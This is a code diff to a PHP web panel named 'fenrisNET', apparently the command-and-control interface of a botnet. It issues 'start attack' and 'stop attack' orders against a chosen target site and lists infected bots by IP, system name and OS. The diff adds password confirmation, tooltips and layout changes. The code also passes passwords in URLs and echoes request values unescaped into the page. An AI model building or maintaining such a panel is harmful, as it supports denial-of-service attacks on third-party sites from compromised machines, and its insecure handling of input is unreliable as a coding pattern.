@@ -88,7 +88,7 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 
 	// save new password
 	$pwMessage = 0;
-	if($_GET['np'] != "") {
+	if($_GET['np'] != "" && $_GET['npc'] != "" && $_GET['np'] == $_GET['npc']) {
 		$writePw = fopen($passFile, "w");
 		fwrite($writePw, hash("sha512", $_GET['np'])."\n");
 		fclose($writePw);
@@ -107,6 +107,9 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "<link rel=\"stylesheet\" href=\"/resources/demos/style.css\">";
 	print "<script>";
 	print "$(function() {";
+	print "$( document ).tooltip({";
+	print "track: true";
+	print "});";
 	print "$( \"#tabs\" ).tabs();";
 	print "$( \"#accordion\" ).accordion({collapsible: true});";
 	print "$( \"#attackorder\" ).selectmenu();";
@@ -117,7 +120,7 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
         print "function callback() {";
         print "setTimeout(function() {";
         print "$( \"#effect:visible\" ).removeAttr( \"style\" ).fadeOut();";
-        print "}, 2000 );";
+        print "}, 3000 );";
         print "};";
         print "$( \"#effect\" ).toggle(function() {";
         print "runEffect();";
@@ -125,13 +128,6 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
         print "$( \"#effect\" ).hide();";
 	print "});";
 	print "</script>";
-	print "<style>";
-	print "select {";
-	print "width: 150px;";
-	print "font-size: 14px;";
-	print "}";
-        print "#effect { font-family: Arial, sans-serif; font-size: 14px; width: 95%; padding: 0.4em; text-align: center; background: #00B3FF; border: 0px; color: #ffffff;}";
-	print "</style>";
 	print "</head>";
 	print "<body id=\"bodyLogin\">";
 
@@ -142,7 +138,6 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "<li><a href=\"#tabs-1\">Welcome</a></li>";
 	print "<li><a href=\"#tabs-2\">Settings</a></li>";
 	print "</ul>";
-
 	print "<div id=\"tabs-1\" style=\"font-family:  Arial, sans-serif; font-size: 14px;\">";
 
  	if ($_GET['order'] != "" && $_GET['target'] != "") {
@@ -152,14 +147,19 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
                 print "</div>";
                 print "</div>";
         }
-	if ($_GET['np'] != "") {
+	if ($_GET['np'] != "" && $_GET['npc'] != "") {
                 print "<div align=\"center\">";
-                print "<div id=\"effect\" class=\"ui-widget-content ui-corner-all\">";
-                print "Password changed.";
+		if($_GET['np'] == $_GET['npc']) {
+			print "<div id=\"effect\" class=\"ui-widget-content ui-corner-all\">";
+                	print "Password changed.";
+		}
+		else {
+			print "<div id=\"effect\" style=\"background: #FF6372\" class=\"ui-widget-content ui-corner-all\">";
+			print "Password NOT changed! (\"confirm password\" and \"new password\" did not match)";
+		}
                 print "</div>";
                 print "</div>";
         }
-
 
 	print "<div id=\"accordion\">";
 	print "<h3>Attack Status</h3>";
@@ -181,7 +181,6 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	$allBots = scandir("data/bots/");
 	print count($allBots)-2;
 	print "</td></tr>";
-
 	print "</table>";
 	print "</div>";
 
@@ -189,19 +188,19 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "<h3>Broadcast New Orders</h3>";
 	print "<div>";
 	print "<form method=\"get\">";
-	print "<table border=\"0\"><tr>";
-	print "<td><select name=\"order\" id=\"attackorder\">";
+	print "<table border=\"0\"><tr><td>";
+	print "<select name=\"order\" id=\"attackorder\">";
 	print "<option value=\"yes\">start attack</option>";
 	print "<option value=\"no\">stop attack</option>";
 	print "</select></td>";
-        print "<td><input id=\"input\" type=\"text\" name=\"target\" value=\"".$target."\"></td>";
-	if ($_GET['np'] == "") {
+        print "<td><input id=\"input\" title=\"Which site do you want to attack?\" type=\"text\" name=\"target\" value=\"".$target."\"></td>";
+	if ($_GET['np'] == "" || $_GET['npc'] == "" || $_GET['np'] != $_GET['npc']) {
 		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['p']."\">";
 	}
 	else {
 		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['np']."\">";
 	}
-        print "<td><input id=\"loginButton\" type=\"submit\" value=\"Submit\"></td>";
+        print "<td><input id=\"loginButton\" type=\"Submit\" value=\"Submit\" onclick=\"go()\"></td>";
 	print "</tr></table>";
         print "</form>";
 	print "</div>";
@@ -209,7 +208,6 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "<h3>Bot Details</h3>";
         print "<div>";
 	print "<table border=\"1\" class=\"attackStatusTable\" cellspacing=\"0\">";
-
 	print "<tr><td class=\"attackStatusHead\">IP</td><td class=\"attackStatusHead\">System Name</td><td class=\"attackStatusHead\">Operating System</td><td class=\"attackStatusHead\">Architecture</td></tr>";
 	$allBots = scandir("data/bots/");
 	if(count($allBots) <= 2) {
@@ -244,12 +242,11 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "<div id=\"tabs-2\" style=\"font-family:  Arial, sans-serif; font-size: 14px;\">";
 	print "<form method=\"get\">";
 	print "<table border=\"0\"><tr>";
-        print "<td>Change password: </td><td><input id=\"input\" type=\"password\" name=\"p\" placeholder=\"old password\"></td>";
-        print "<td><input id=\"input\" type=\"password\" name=\"np\" placeholder=\"new password\"></td>";
-        print "<td><input id=\"loginButton\" type=\"submit\" value=\"Submit\"></td>";
+        print "<td>Change password: </td><td><input id=\"input\" type=\"password\" name=\"p\" placeholder=\"old password\"></td></tr>";
+        print "<tr><td></td><td><input id=\"input\" type=\"password\" name=\"np\" placeholder=\"new password\"></td><td><input id=\"input\" type=\"password\" name=\"npc\" placeholder=\"confirm new password\"></td></tr>";
+        print "<tr><td></td><td><input id=\"loginButton\" type=\"submit\" value=\"Submit\"></td>";
 	print "</tr></table>";
         print "</form>";
-
 	print "</div>";
 	print "</td></tr><tr><td>";
 	print "<div id=\"logout\" align=\"right\"><form method=\"get\">";
@@ -265,7 +262,6 @@ else {
 	print "<html>";
 	print "<head>";
 	print "<title>fenrisNET Login Panel</title>";
-
 	print "<link rel=\"stylesheet\" href=\"//code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css\">";
         print "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\">";
         print "<script src=\"//code.jquery.com/jquery-1.10.2.js\"></script>";
@@ -294,7 +290,6 @@ else {
 
 	print "</head>";
 	print "<body id=\"bodyLogin\">";
-
 	print "<table border=\"0\" id=\"loginTable\"><tr><td>";
 	print "<img id=\"headlineLogin\" src=\"images/logo.png\">";
 	print "</td></tr><tr><td>";
@@ -307,7 +302,6 @@ else {
 	print "</form>";
 	print "</div>";
 	print "</table>";
-
 	print "</td></tr><tr><td>";
 	if ($curPw != hash("sha512", $_GET['p']) && $_GET['p'] != "") {
 		print "<div align=\"center\">";
@@ -317,7 +311,6 @@ else {
 		print "</div>";
 	}
 	print "</td></tr></table>";
-
 	print "</body>";
 	print "</html>";
 }
